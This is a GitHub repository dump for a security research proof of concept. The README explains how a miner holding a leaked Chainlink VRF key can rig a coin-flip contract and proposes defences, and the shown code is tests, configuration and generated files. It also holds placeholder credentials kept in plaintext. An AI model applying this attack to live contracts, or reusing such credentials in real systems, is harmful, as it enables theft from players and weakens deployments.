*GitHub Repository "han0110/evilink"*

'''--- .chainlink/secret/api.txt ---
admin@example.com
password
'''
'''--- .chainlink/secret/passphrase.txt ---
evilink
'''
'''--- .postgres/initdb.d/create-database-chainlink.sh ---
#!/bin/bash

set -e

psql -v ON_ERROR_STOP=1 --username "$POSTGRES_USER" --dbname "$POSTGRES_DB" <<-EOSQL
    CREATE USER ${CHAINLINK_USER} WITH PASSWORD '${CHAINLINK_PASSWORD}';
    CREATE DATABASE ${CHAINLINK_DB};
    GRANT ALL PRIVILEGES ON DATABASE ${CHAINLINK_DB} TO ${CHAINLINK_USER};
EOSQL

'''
'''--- .postgres/initdb.d/create-database-the-graph.sh ---
#!/bin/bash

set -e

psql -v ON_ERROR_STOP=1 --username "$POSTGRES_USER" --dbname "$POSTGRES_DB" <<-EOSQL
    CREATE USER ${THE_GRAPH_USER} WITH PASSWORD '${THE_GRAPH_PASSWORD}';
    ALTER ROLE ${THE_GRAPH_USER} SUPERUSER;
    CREATE DATABASE ${THE_GRAPH_DB};
    GRANT ALL PRIVILEGES ON DATABASE ${THE_GRAPH_DB} TO ${THE_GRAPH_USER};
EOSQL

'''
'''--- .solhint.json ---
{
  "extends": "solhint:recommended",
  "plugins": ["prettier"],
  "rules": {
    "prettier/prettier": "error",
    "reason-string": "off",
    "compiler-version": "off",
    "func-visibility": [
      "warn",
      {
        "ignoreConstructors": true
      }
    ]
  }
}

'''
'''--- .yarnrc.yml ---
nodeLinker: node-modules

plugins:
  - path: .yarn/plugins/@yarnpkg/plugin-workspace-tools.cjs
    spec: "@yarnpkg/plugin-workspace-tools"
  - path: .yarn/plugins/@yarnpkg/plugin-interactive-tools.cjs
    spec: "@yarnpkg/plugin-interactive-tools"
  - path: .yarn/plugins/@yarnpkg/plugin-docker-build.cjs
    spec: "https://github.com/Dcard/yarn-plugins/releases/latest/download/plugin-docker-build.js"

yarnPath: .yarn/releases/yarn-berry.cjs

'''
'''--- README.md ---
# EVILink

![CI](https://github.com/han0110/evilink/workflows/CI/badge.svg)

EVILink shows that a malicious miner still has a slim chance to tamper randomness provided by Chainlink's [VRF](https://blog.chain.link/verifiable-random-functions-vrf-random-number-generation-rng-feature) solution.

- [EVILink](#evilink)
  - [Concept](#concept)
    - [What a Slim Chance](#what-a-slim-chance)
    - [Proof of Concept](#proof-of-concept)
    - [Rethink](#rethink)
    - [Take Away](#take-away)
  - [Packages](#packages)
    - [Contracts](#contracts)
    - [Common Utilities](#common-utilities)
    - [Chainlink Utilities](#chainlink-utilities)
    - [Applications](#applications)
  - [Development](#development)
    - [Prerequisite](#prerequisite)
    - [Prepare](#prepare)
    - [Build Docker Image](#build-docker-image)
    - [Start Docker Container](#start-docker-container)
  - [Reference](#reference)

## Concept

### What a Slim Chance

Chainlink VRF is an awesome solution for **NEARLY tamper-proof randomness**. Why say **NEARLY tamper-proof**? For a verifiable randomness implemented by Chainlink, it is composed by these parameters ordered by their generation time:

1. `vrf_key` - generated before the corresponding public key registered as VRF service
2. `user_seed` - provided when user interact with the contract
3. `block_hash` and `block_number` - block containing the event `RandomnessRequest`

The only parameter tamperable after transaction sent is the `block_hash`, which can be easily tuned by change the block head extra data, but miner still has no way to predict randomness if it does not have `vrf_key`. However, there exists these situations for randomenss to be tamperable:

1. `vrf_key` is leaked to miner
2. `vrf_key` is held by miner from the beginning
3. miner conspires with the malicious `vrf_key` holder

So miner can tune the `block_hash` to get the favorable result before mining.

| Condition  | Diagram                                           |
| ---------- | ------------------------------------------------- |
| Normal     | ![VRF Tamper Proof](./asset/vrf-tamper-proof.png) |
| Key Leaked | ![VRF Tamperable](./asset/vrf-tamperable.png)     |

### Proof of Concept

Here I present the first situation of randomenss to be tamperable to hack a coin tossing game. When malicious miner steals the `vrf_key`, it can make owner of the contract [`FlipCoin.sol`](./contracts/flipcoin/contract/FlipCoin.sol) always win and others always lose.

| Owner                                | Others                                 |
| ------------------------------------ | -------------------------------------- |
| ![owner](./asset/flipcoin-owner.gif) | ![others](./asset/flipcoin-others.gif) |

### Rethink

So why Chainlink includes the manipulatable block information to be part of randomness? The reason is because the randomness will be fully manipulatable by `vrf_key` holder if it is only composed by `vrf_key` and `user_seed` (when holder is the user). The design to include block information prevents the **single-point-malicious** in most time.

### Take Away

From Chainlink's awesome [blog](https://blog.chain.link/verifiable-random-functions-vrf-random-number-generation-rng-feature/#the-planned-evolution-of-chainlink-vrf), they are already integrating [threshold signatures](https://blog.chain.link/threshold-signatures-in-chainlink) with VRF to prevent **single-key-leaked-failure**, which is not only cost-effective and high-availability, but also is almost a tamper-proof randomness solution (in theory we still have very slim change to collect enough key shares, but extremely hard). Super looking forward to the approach.

But before the upcoming approach, we can still use current version VRF with some good practices:

1. Contract should have a mechanism (by voting or by admin) to change the VRF service in case current one is thought malicious or key leaked.
2. Contract could request multiple randomness in **one transaction** and combine incoming randomnesses to be final randomness for a safer approach, it will be tamper-proof when **at least one secret key holder is safe and honest**. However, it costs much more both time and LINK. Implementation can be found [here](/contracts/chainlink/contract-0.6/ThresholdVRFConsumer.sol).
  ![Threshold VRF](./asset/threshold-vrf.png)

## Packages

### Contracts

| Package                                                        | Description                         |
| -------------------------------------------------------------- | ----------------------------------- |
| [`@evilink/contracts-chainlink`](contracts/chainlink)         | Chainlink related contracts         |
| [`@evilink/contracts-faucet`](contracts/faucet)               | Faucet contract for ether           |
| [`@evilink/contracts-flipcoin`](contracts/flipcoin)           | Coin tossing game using VRFConsumer |

### Common Utilities

| Package                                             | Description                                              |
| --------------------------------------------------- | -------------------------------------------------------- |
| [`@evilink/artifact-util`](packages/artifact-util) | Artifact util for contract factory                       |
| [`@evilink/constant`](packages/constant)           | Constant including contract address, genesis private key |

### Chainlink Utilities

| Package                                                   | Description                                           |
| --------------------------------------------------------- | ----------------------------------------------------- |
| [`@evilink/chainlink-client`](packages/chainlink-client) | Chainlink API client                                  |
| [`@evilink/chainlink-orm`](packages/chainlink-orm)       | Chainlink ORM client                                  |
| [`@evilink/chainlink-vrf`](packages/chainlink-vrf)       | Chainlink VRF implementation in golang as gyp binding |

### Applications

| Package                                         | Description                                               |
| ----------------------------------------------- | --------------------------------------------------------- |
| [`@evilink/evilthereum`](packages/evilthereum) | Malicious miner with VRF key hacking VRFConsumers         |
| [`@evilink/playground`](packages/playground)   | Frontend for interaction with hacked contracts            |

## Development

### Prerequisite

- go1.15
- yarn2

### Prepare

```bash
# build chainlink vrf for gyp binding
pushd packages/chainlink-vrf/go && make && popd
yarn --immutable
yarn build
```

### Build Docker Image

```bash
bash script/run.sh build
```

### Start Docker Container

```bash
cp docker-compose.sample.env docker-compose.env
# after update the values in docker-compose.env
bash script/run.sh up
# wait for ipfs and graph-node ready
bash script/run.sh deploy_subgraph flipcoin
```

## Reference

- [Chainlink VRF: On-chain Verifiable Randomness](https://blog.chain.link/verifiable-random-functions-vrf-random-number-generation-rng-feature)
- [Making NSEC5 Practical for DNSSEC](https://eprint.iacr.org/2017/099.pdf)

'''
'''--- contracts/chainlink/package.json ---
{
  "name": "@evilink/contracts-chainlink",
  "version": "0.1.0",
  "main": "./lib/src/index.js",
  "exports": {
    ".": "./lib/src/index.js"
  },
  "scripts": {
    "build": "yarn compile && yarn build:ts",
    "build:ts": "tsc -b",
    "compile": "yarn compile:0.4 && yarn compile:0.6",
    "compile:0.4": "CONTRACT_SRC_DIR=./contract-0.4 waffle compile ../waffle-0.4",
    "compile:0.4:watch": "nodemon --exec 'CONTRACT_SRC_DIR=./contract-0.4 waffle compile ../waffle-0.4' --watch ./contract-0.4 --ext sol",
    "compile:0.6": "CONTRACT_SRC_DIR=./contract-0.6 waffle compile ../waffle-0.6",
    "compile:0.6:watch": "nodemon --exec 'CONTRACT_SRC_DIR=./contract-0.6 waffle compile ../waffle-0.6' --watch ./contract-0.6 --ext sol",
    "test": "NODE_ENV=test mocha --require ts-node/register -t 30000 ./test/**/*.test.ts",
    "test:watch": "yarn test --watch --watch-files ./test/**/*.test.ts",
    "flatten": "yarn flatten:0.4 && yarn flatten:0.6",
    "flatten:0.4": "CONTRACT_SRC_DIR=./contract-0.4 waffle flatten ../waffle-0.4",
    "flatten:0.6": "CONTRACT_SRC_DIR=./contract-0.6 waffle flatten ../waffle-0.6",
    "clean": "rm -rf lib contract-artifact"
  },
  "dependencies": {
    "@chainlink/contracts": "^0.0.11",
    "@ethersproject/contracts": "^5.0.8",
    "@ethersproject/providers": "^5.0.17",
    "@ethersproject/wallet": "^5.0.9",
    "@evilink/artifact-util": "0.1.0",
    "@openzeppelin/contracts": "^3.3.0"
  },
  "devDependencies": {
    "@ethersproject/bignumber": "^5.0.12",
    "@ethersproject/bytes": "^5.0.8",
    "@ethersproject/random": "^5.0.6",
    "@evilink/chainlink-vrf": "0.1.0",
    "@types/mocha": "^8.2.0",
    "chai": "^4.2.0",
    "ethereum-waffle": "^3.2.1",
    "mocha": "^8.2.1",
    "nodemon": "^2.0.6",
    "ts-node": "^9.1.1",
    "typescript": "^4.1.3"
  },
  "license": "MIT"
}

'''
'''--- contracts/chainlink/src/artifact.ts ---
import {
  createContractFactory,
  StandardContractOutput,
  ContractFactory,
} from '@evilink/artifact-util'

import * as VRFCoordinator from '@chainlink/contracts/abi/v0.6/VRFCoordinator.json'
import * as BlockhashStore from '@chainlink/contracts/abi/v0.6/BlockhashStore.json'
import * as MockLinkToken from '../contract-artifact/MockLinkToken.json'

export const artifact = {
  MockLinkToken: MockLinkToken as StandardContractOutput,
  VRFCoordinator: VRFCoordinator.compilerOutput as StandardContractOutput,
  BlockhashStore: BlockhashStore.compilerOutput as StandardContractOutput,
}

export const mockLinkTokenFactory = createContractFactory(
  artifact.MockLinkToken,
)
export const vrfCoordinatorFactory = createContractFactory(
  artifact.VRFCoordinator,
)
export const blockhashStoreFactory = createContractFactory(
  artifact.BlockhashStore,
)

export { StandardContractOutput, ContractFactory }

'''
'''--- contracts/chainlink/src/chainlink-stack.ts ---
import { Contract } from '@ethersproject/contracts'
import { TransactionRequest } from '@ethersproject/providers'
import { Wallet } from '@ethersproject/wallet'
import {
  mockLinkTokenFactory,
  blockhashStoreFactory,
  vrfCoordinatorFactory,
} from './artifact'

export type ChainlinkStack = {
  mockLinkToken: Contract
  vrfCoordinator: Contract
}

export const deployChainlinkStack = async (
  deployer: Wallet,
  options?: TransactionRequest,
): Promise<ChainlinkStack> => {
  const mockLinkToken = await mockLinkTokenFactory.deploy(
    deployer,
    options ?? {},
  )
  const blockhashStore = await blockhashStoreFactory.deploy(
    deployer,
    options ?? {},
  )
  const vrfCoordinator = await vrfCoordinatorFactory.deploy(
    deployer,
    mockLinkToken.address,
    blockhashStore.address,
    options ?? {},
  )

  return { mockLinkToken, vrfCoordinator }
}

'''
'''--- contracts/chainlink/src/index.ts ---
export * from './artifact'
export * from './chainlink-stack'

'''
'''--- contracts/chainlink/test/MockLinkToken.test.ts ---
import { expect, use } from 'chai'
import { MockProvider, solidity } from 'ethereum-waffle'
import { BigNumber } from '@ethersproject/bignumber'
import { Contract } from '@ethersproject/contracts'
import { mockLinkTokenFactory } from '../src/artifact'

use(solidity)

describe('MockLinkToken', () => {
  const [deployer, alice, bob] = new MockProvider().getWallets()

  let mockLinkToken: Contract

  beforeEach(async () => {
    mockLinkToken = await mockLinkTokenFactory.deploy(deployer)
    expect(mockLinkToken.address).to.properAddress
  })

  it('should give UNCONDITIONAL_BALANCE to anyone who triggers the transferAndCall for the first time', async () => {
    mockLinkToken = mockLinkToken.connect(alice)

    const UNCONDITIONAL_BALANCE = await mockLinkToken.UNCONDITIONAL_BALANCE()

    const initialBalance = await mockLinkToken.balanceOf(alice.address)
    expect(initialBalance).to.equal(0)

    const amount = BigNumber.from(10).pow(18)
    await expect(() =>
      mockLinkToken.transferAndCall(bob.address, amount, '0x'),
    ).to.changeTokenBalances(
      mockLinkToken,
      [alice, bob],
      [UNCONDITIONAL_BALANCE.sub(amount), amount],
    )
  })
})

'''
'''--- contracts/chainlink/test/ThresholdVRFConsumer.test.ts ---
import { expect, use } from 'chai'
import { MockProvider, solidity } from 'ethereum-waffle'
import { Contract } from '@ethersproject/contracts'
import { BigNumber } from '@ethersproject/bignumber'
import { randomBytes } from '@ethersproject/random'
import { vrfCoordinatorFactory } from '../src/artifact'
import { mockThresholdVrfConsumerFactory } from './artifact'
import { deployChainlinkStackWithServices, VRFService } from './util'

use(solidity)

describe('ThresholdVRFConsumer', () => {
  const [deployer, ...wallets] = new MockProvider().getWallets()

  let mockLinkToken: Contract
  let vrfCoordinator: Contract
  let vrfServices: Array<VRFService>
  let mockThresholdVrfConsumer: Contract

  beforeEach(async () => {
    ;({
      mockLinkToken,
      vrfCoordinator,
      vrfServices,
    } = await deployChainlinkStackWithServices(wallets))

    mockThresholdVrfConsumer = await mockThresholdVrfConsumerFactory.deploy(
      deployer,
      vrfCoordinator.address,
      mockLinkToken.address,
    )
    expect(mockThresholdVrfConsumer.address).to.properAddress

    // Add services for ThresholdVRFConsumer
    await vrfServices.reduce(
      (promise, { fee, keyHash }) =>
        promise.then(() =>
          expect(mockThresholdVrfConsumer.addService(keyHash, fee))
            .to.emit(mockThresholdVrfConsumer, 'ServiceAdded')
            .withArgs(keyHash, fee),
        ),
      Promise.resolve(),
    )

    expect(await mockThresholdVrfConsumer.totalService()).to.equal(
      vrfServices.length,
    )
  })

  const expectConsume = async (threshold: number) => {
    const tx = await mockThresholdVrfConsumer.consume(
      randomBytes(32), // seed
      threshold,
    )
    await expect(Promise.resolve(tx)).to.emit(
      vrfCoordinator,
      'RandomnessRequest',
    )

    const {
      blockHash,
      blockNumber,
      logs,
    } = await deployer.provider.getTransactionReceipt(tx.hash)
    const preSeeds = logs
      .filter(
        ({ topics: [topic] }) =>
          topic ===
          vrfCoordinatorFactory.interface.getEventTopic('RandomnessRequest'),
      )
      .map(({ data }) => `0x${data.substr(66, 64)}`)
    expect(preSeeds.length).to.eq(threshold)

    // Shuffle randomness orders
    const results = vrfServices
      .slice(0, threshold)
      .map((vrfService, idx) =>
        vrfService.generateProof(preSeeds[idx], blockHash, blockNumber),
      )
    await Promise.all(
      results.map(({ packedForContractInput }, idx) =>
        expect(
          vrfCoordinator
            .connect(wallets[idx])
            .fulfillRandomnessRequest(packedForContractInput),
        ).to.emit(vrfCoordinator, 'RandomnessRequestFulfilled'),
      ),
    )

    expect(await mockThresholdVrfConsumer.randomness()).to.equal(
      results.reduce(
        (xoredRandomness, { randomness }) =>
          xoredRandomness.xor(BigNumber.from(randomness)),
        BigNumber.from(0),
      ),
    )
  }

  it('should consume randomness of threshold 1', () => expectConsume(1))
  it('should consume randomness of threshold 3', () => expectConsume(3))
  it('should consume randomness of threshold 5', () => expectConsume(5))
})

'''
'''--- contracts/chainlink/test/UpgradeableVRFConsumer.test.ts ---
import { expect, use } from 'chai'
import { MockProvider, solidity } from 'ethereum-waffle'
import { Contract } from '@ethersproject/contracts'
import { mockUpgradeableVrfConsumerFactory } from './artifact'
import { deployChainlinkStackWithServices, VRFService } from './util'

use(solidity)

describe('UpgradeableVRFConsumer', () => {
  const [deployer, ...wallets] = new MockProvider().getWallets()

  let mockLinkToken: Contract
  let vrfCoordinator: Contract
  let vrfService: VRFService
  let mockUpgradeableVrfConsumer: Contract

  beforeEach(async () => {
    ;({
      mockLinkToken,
      vrfCoordinator,
      vrfServices: [vrfService],
    } = await deployChainlinkStackWithServices(wallets))

    mockUpgradeableVrfConsumer = await mockUpgradeableVrfConsumerFactory.deploy(
      deployer,
      vrfCoordinator.address,
      mockLinkToken.address,
      vrfService.keyHash,
    )
    expect(mockUpgradeableVrfConsumer.address).to.properAddress
  })

  it('should consume randomness', async () => {
    const userSeed =
      '0xa4e7cb8c8b7e26212584dc75d56a52dd86f17a9fc1024d03b73b6b8db2976844'

    const tx = await mockUpgradeableVrfConsumer.consume(userSeed)
    await expect(Promise.resolve(tx)).to.emit(
      vrfCoordinator,
      'RandomnessRequest',
    )

    const {
      blockHash,
      blockNumber,
      logs,
    } = await deployer.provider.getTransactionReceipt(tx.hash)
    const preSeed = `0x${logs[2].data.substr(66, 64)}`

    const { randomness, packedForContractInput } = vrfService.generateProof(
      preSeed,
      blockHash,
      blockNumber,
    )
    await expect(
      vrfCoordinator.fulfillRandomnessRequest(packedForContractInput),
    ).to.emit(vrfCoordinator, 'RandomnessRequestFulfilled')
    expect(await mockUpgradeableVrfConsumer.randomness()).to.equal(randomness)
  })
})

'''
'''--- contracts/chainlink/test/artifact.ts ---
import {
  createContractFactory,
  StandardContractOutput,
  ContractFactory,
} from '@evilink/artifact-util'

import * as MockUpgradeableVRFConsumer from '../contract-artifact/MockUpgradeableVRFConsumer.json'
import * as MockThresholdVRFConsumer from '../contract-artifact/MockThresholdVRFConsumer.json'

export const artifact = {
  MockUpgradeableVRFConsumer: MockUpgradeableVRFConsumer as StandardContractOutput,
  MockThresholdVRFConsumer: MockThresholdVRFConsumer as StandardContractOutput,
}

export const mockUpgradeableVrfConsumerFactory = createContractFactory(
  artifact.MockUpgradeableVRFConsumer,
)
export const mockThresholdVrfConsumerFactory = createContractFactory(
  artifact.MockThresholdVRFConsumer,
)

export { StandardContractOutput, ContractFactory }

'''
'''--- contracts/chainlink/test/util.ts ---
/* eslint-disable import/no-extraneous-dependencies */

import { expect, use } from 'chai'
import { solidity } from 'ethereum-waffle'
import { hexlify } from '@ethersproject/bytes'
import { randomBytes } from '@ethersproject/random'
import { Contract } from '@ethersproject/contracts'
import { Wallet } from '@ethersproject/wallet'
import { generateProof, publicKey, Proof } from '@evilink/chainlink-vrf'
import { deployChainlinkStack } from '../src/chainlink-stack'

use(solidity)

export type VRFService = {
  privateKey: string
  keyHash: string
  x: string
  y: string
  oracleAddress: string
  jobId: string
  fee: number
  generateProof: (
    preSeed: string,
    blockHash: string,
    blockNumber: number,
  ) => Proof
}

export const deployChainlinkStackWithServices = async (
  wallets: Wallet[],
): Promise<{
  mockLinkToken: Contract
  vrfCoordinator: Contract
  vrfServices: Array<VRFService>
}> => {
  const { mockLinkToken, vrfCoordinator } = await deployChainlinkStack(
    wallets[0],
  )
  expect(mockLinkToken.address).to.properAddress
  expect(vrfCoordinator.address).to.properAddress

  // Random services
  const vrfServices = Array(5)
    .fill(undefined)
    .map(() => {
      const privateKey = hexlify(randomBytes(32))
      const { x, y, hash } = publicKey(privateKey)
      return {
        privateKey,
        x,
        y,
        keyHash: hash,
        oracleAddress: hexlify(randomBytes(20)),
        jobId: hexlify(randomBytes(32)),
        fee: 0,
        generateProof: (
          preSeed: string,
          blockHash: string,
          blockNumber: number,
        ) => generateProof(privateKey, preSeed, blockHash, blockNumber),
      }
    })

  // Register services
  await Promise.all(
    vrfServices.map(({ fee, oracleAddress, x, y, keyHash, jobId }, idx) =>
      expect(
        vrfCoordinator
          .connect(wallets[idx + 1])
          .registerProvingKey(fee, oracleAddress, [x, y], jobId),
      )
        .to.emit(vrfCoordinator, 'NewServiceAgreement')
        .withArgs(keyHash, fee),
    ),
  )

  return {
    mockLinkToken,
    vrfCoordinator,
    vrfServices,
  }
}

'''
'''--- contracts/chainlink/tsconfig.json ---
{
  "extends": "../../tsconfig.json",
  "compilerOptions": {
    "outDir": "lib"
  },
  "include": ["src/**/*"]
}

'''
'''--- contracts/faucet/package.json ---
{
  "name": "@evilink/contracts-faucet",
  "version": "0.1.0",
  "main": "./lib/src/index.js",
  "exports": {
    ".": "./lib/src/index.js"
  },
  "scripts": {
    "build": "yarn compile && yarn build:ts",
    "build:ts": "tsc -b",
    "compile": "waffle compile ../waffle-0.8",
    "compile:watch": "nodemon --exec 'waffle compile ../waffle-0.8' --watch contract --ext sol",
    "test": "NODE_ENV=test mocha --require ts-node/register -t 5000 ./test/**/*.test.ts",
    "test:watch": "yarn test --watch --watch-files ./test/**/*.test.ts,./build/*.json",
    "flatten": "waffle flatten ../waffle-0.8",
    "clean": "rm -rf lib contract-artifact"
  },
  "dependencies": {
    "@evilink/artifact-util": "0.1.0",
    "@openzeppelin/contracts": "^3.3.0"
  },
  "devDependencies": {
    "@ethersproject/constants": "^5.0.7",
    "@ethersproject/contracts": "^5.0.8",
    "@types/mocha": "^8.2.0",
    "chai": "^4.2.0",
    "ethereum-waffle": "^3.2.1",
    "mocha": "^8.2.1",
    "nodemon": "^2.0.6",
    "ts-node": "^9.1.1",
    "typescript": "^4.1.3"
  },
  "license": "MIT"
}

'''
'''--- contracts/faucet/src/artifact.ts ---
import {
  createContractFactory,
  StandardContractOutput,
  ContractFactory,
} from '@evilink/artifact-util'

import * as Faucet from '../contract-artifact/Faucet.json'

export const artifact = {
  Faucet: Faucet as StandardContractOutput,
}

export const faucetFactory = createContractFactory(artifact.Faucet)

export { StandardContractOutput, ContractFactory }

'''
'''--- contracts/faucet/src/index.ts ---
export * from './artifact'

'''
'''--- contracts/faucet/test/Faucet.test.ts ---
import { expect, use } from 'chai'
import { MockProvider, solidity } from 'ethereum-waffle'
import { Contract } from '@ethersproject/contracts'
import { WeiPerEther } from '@ethersproject/constants'
import { faucetFactory } from '../src'

use(solidity)

describe('Faucet', () => {
  const [walletA, walletB] = new MockProvider().getWallets()

  let faucet: Contract

  beforeEach(async () => {
    faucet = await faucetFactory.deploy(walletA)
    expect(faucet.address).to.be.properAddress
    await walletA.sendTransaction({
      to: faucet.address,
      value: WeiPerEther.mul(50),
    })
  })

  it('should withdraw', async () => {
    await expect(await faucet.withdraw(WeiPerEther)).to.changeEtherBalances(
      [walletA, faucet],
      [WeiPerEther, WeiPerEther.mul(-1)],
    )
  })

  it('should withdrawTo', async () => {
    await expect(
      await faucet.withdrawTo(walletB.address, WeiPerEther),
    ).to.changeEtherBalances(
      [walletA, walletB, faucet],
      [0, WeiPerEther, WeiPerEther.mul(-1)],
    )
  })
})

'''
'''--- contracts/faucet/tsconfig.json ---
{
  "extends": "../../tsconfig.json",
  "compilerOptions": {
    "outDir": "lib"
  },
  "include": ["src/**/*"]
}

'''
'''--- contracts/flipcoin/generated/FlipCoin/FlipCoin.ts ---
// THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.

import {
  ethereum,
  JSONValue,
  TypedMap,
  Entity,
  Bytes,
  Address,
  BigInt
} from "@graphprotocol/graph-ts";

export class OwnershipTransferred extends ethereum.Event {
  get params(): OwnershipTransferred__Params {
    return new OwnershipTransferred__Params(this);
  }
}

export class OwnershipTransferred__Params {
  _event: OwnershipTransferred;

  constructor(event: OwnershipTransferred) {
    this._event = event;
  }

  get previousOwner(): Address {
    return this._event.parameters[0].value.toAddress();
  }

  get newOwner(): Address {
    return this._event.parameters[1].value.toAddress();
  }
}

export class Played extends ethereum.Event {
  get params(): Played__Params {
    return new Played__Params(this);
  }
}

export class Played__Params {
  _event: Played;

  constructor(event: Played) {
    this._event = event;
  }

  get player(): Address {
    return this._event.parameters[0].value.toAddress();
  }

  get side(): boolean {
    return this._event.parameters[1].value.toBoolean();
  }
}

export class Subsidized extends ethereum.Event {
  get params(): Subsidized__Params {
    return new Subsidized__Params(this);
  }
}

export class Subsidized__Params {
  _event: Subsidized;

  constructor(event: Subsidized) {
    this._event = event;
  }

  get subsidizer(): Address {
    return this._event.parameters[0].value.toAddress();
  }

  get amount(): BigInt {
    return this._event.parameters[1].value.toBigInt();
  }
}

export class FlipCoin extends ethereum.SmartContract {
  static bind(address: Address): FlipCoin {
    return new FlipCoin("FlipCoin", address);
  }

  PLAY_FEE(): BigInt {
    let result = super.call("PLAY_FEE", "PLAY_FEE():(uint256)", []);

    return result[0].toBigInt();
  }

  try_PLAY_FEE(): ethereum.CallResult<BigInt> {
    let result = super.tryCall("PLAY_FEE", "PLAY_FEE():(uint256)", []);
    if (result.reverted) {
      return new ethereum.CallResult();
    }
    let value = result.value;
    return ethereum.CallResult.fromValue(value[0].toBigInt());
  }

  PLAY_REWARD(): BigInt {
    let result = super.call("PLAY_REWARD", "PLAY_REWARD():(uint256)", []);

    return result[0].toBigInt();
  }

  try_PLAY_REWARD(): ethereum.CallResult<BigInt> {
    let result = super.tryCall("PLAY_REWARD", "PLAY_REWARD():(uint256)", []);
    if (result.reverted) {
      return new ethereum.CallResult();
    }
    let value = result.value;
    return ethereum.CallResult.fromValue(value[0].toBigInt());
  }

  balanceOf(player: Address): BigInt {
    let result = super.call("balanceOf", "balanceOf(address):(uint256)", [
      ethereum.Value.fromAddress(player)
    ]);

    return result[0].toBigInt();
  }

  try_balanceOf(player: Address): ethereum.CallResult<BigInt> {
    let result = super.tryCall("balanceOf", "balanceOf(address):(uint256)", [
      ethereum.Value.fromAddress(player)
    ]);
    if (result.reverted) {
      return new ethereum.CallResult();
    }
    let value = result.value;
    return ethereum.CallResult.fromValue(value[0].toBigInt());
  }

  jackpot(): BigInt {
    let result = super.call("jackpot", "jackpot():(uint256)", []);

    return result[0].toBigInt();
  }

  try_jackpot(): ethereum.CallResult<BigInt> {
    let result = super.tryCall("jackpot", "jackpot():(uint256)", []);
    if (result.reverted) {
      return new ethereum.CallResult();
    }
    let value = result.value;
    return ethereum.CallResult.fromValue(value[0].toBigInt());
  }

  owner(): Address {
    let result = super.call("owner", "owner():(address)", []);

    return result[0].toAddress();
  }

  try_owner(): ethereum.CallResult<Address> {
    let result = super.tryCall("owner", "owner():(address)", []);
    if (result.reverted) {
      return new ethereum.CallResult();
    }
    let value = result.value;
    return ethereum.CallResult.fromValue(value[0].toAddress());
  }

  playerOf(requestId: Bytes): Address {
    let result = super.call("playerOf", "playerOf(bytes32):(address)", [
      ethereum.Value.fromFixedBytes(requestId)
    ]);

    return result[0].toAddress();
  }

  try_playerOf(requestId: Bytes): ethereum.CallResult<Address> {
    let result = super.tryCall("playerOf", "playerOf(bytes32):(address)", [
      ethereum.Value.fromFixedBytes(requestId)
    ]);
    if (result.reverted) {
      return new ethereum.CallResult();
    }
    let value = result.value;
    return ethereum.CallResult.fromValue(value[0].toAddress());
  }
}

export class ConstructorCall extends ethereum.Call {
  get inputs(): ConstructorCall__Inputs {
    return new ConstructorCall__Inputs(this);
  }

  get outputs(): ConstructorCall__Outputs {
    return new ConstructorCall__Outputs(this);
  }
}

export class ConstructorCall__Inputs {
  _call: ConstructorCall;

  constructor(call: ConstructorCall) {
    this._call = call;
  }
}

export class ConstructorCall__Outputs {
  _call: ConstructorCall;

  constructor(call: ConstructorCall) {
    this._call = call;
  }
}

export class RenounceOwnershipCall extends ethereum.Call {
  get inputs(): RenounceOwnershipCall__Inputs {
    return new RenounceOwnershipCall__Inputs(this);
  }

  get outputs(): RenounceOwnershipCall__Outputs {
    return new RenounceOwnershipCall__Outputs(this);
  }
}

export class RenounceOwnershipCall__Inputs {
  _call: RenounceOwnershipCall;

  constructor(call: RenounceOwnershipCall) {
    this._call = call;
  }
}

export class RenounceOwnershipCall__Outputs {
  _call: RenounceOwnershipCall;

  constructor(call: RenounceOwnershipCall) {
    this._call = call;
  }
}

export class TransferOwnershipCall extends ethereum.Call {
  get inputs(): TransferOwnershipCall__Inputs {
    return new TransferOwnershipCall__Inputs(this);
  }

  get outputs(): TransferOwnershipCall__Outputs {
    return new TransferOwnershipCall__Outputs(this);
  }
}

export class TransferOwnershipCall__Inputs {
  _call: TransferOwnershipCall;

  constructor(call: TransferOwnershipCall) {
    this._call = call;
  }

  get newOwner(): Address {
    return this._call.inputValues[0].value.toAddress();
  }
}

export class TransferOwnershipCall__Outputs {
  _call: TransferOwnershipCall;

  constructor(call: TransferOwnershipCall) {
    this._call = call;
  }
}

export class WithdrawCall extends ethereum.Call {
  get inputs(): WithdrawCall__Inputs {
    return new WithdrawCall__Inputs(this);
  }

  get outputs(): WithdrawCall__Outputs {
    return new WithdrawCall__Outputs(this);
  }
}

export class WithdrawCall__Inputs {
  _call: WithdrawCall;

  constructor(call: WithdrawCall) {
    this._call = call;
  }

  get amount(): BigInt {
    return this._call.inputValues[0].value.toBigInt();
  }
}

export class WithdrawCall__Outputs {
  _call: WithdrawCall;

  constructor(call: WithdrawCall) {
    this._call = call;
  }
}

'''
'''--- contracts/flipcoin/generated/schema.ts ---
// THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.

import {
  TypedMap,
  Entity,
  Value,
  ValueKind,
  store,
  Address,
  Bytes,
  BigInt,
  BigDecimal
} from "@graphprotocol/graph-ts";

export class FlipCoin extends Entity {
  constructor(id: string) {
    super();
    this.set("id", Value.fromString(id));
  }

  save(): void {
    let id = this.get("id");
    assert(id !== null, "Cannot save FlipCoin entity without an ID");
    assert(
      id.kind == ValueKind.STRING,
      "Cannot save FlipCoin entity with non-string ID. " +
        'Considering using .toHex() to convert the "id" to a string.'
    );
    store.set("FlipCoin", id.toString(), this);
  }

  static load(id: string): FlipCoin | null {
    return store.get("FlipCoin", id) as FlipCoin | null;
  }

  get id(): string {
    let value = this.get("id");
    return value.toString();
  }

  set id(value: string) {
    this.set("id", Value.fromString(value));
  }

  get owner(): Bytes {
    let value = this.get("owner");
    return value.toBytes();
  }

  set owner(value: Bytes) {
    this.set("owner", Value.fromBytes(value));
  }

  get jackpot(): BigInt {
    let value = this.get("jackpot");
    return value.toBigInt();
  }

  set jackpot(value: BigInt) {
    this.set("jackpot", Value.fromBigInt(value));
  }
}

export class Player extends Entity {
  constructor(id: string) {
    super();
    this.set("id", Value.fromString(id));
  }

  save(): void {
    let id = this.get("id");
    assert(id !== null, "Cannot save Player entity without an ID");
    assert(
      id.kind == ValueKind.STRING,
      "Cannot save Player entity with non-string ID. " +
        'Considering using .toHex() to convert the "id" to a string.'
    );
    store.set("Player", id.toString(), this);
  }

  static load(id: string): Player | null {
    return store.get("Player", id) as Player | null;
  }

  get id(): string {
    let value = this.get("id");
    return value.toString();
  }

  set id(value: string) {
    this.set("id", Value.fromString(value));
  }

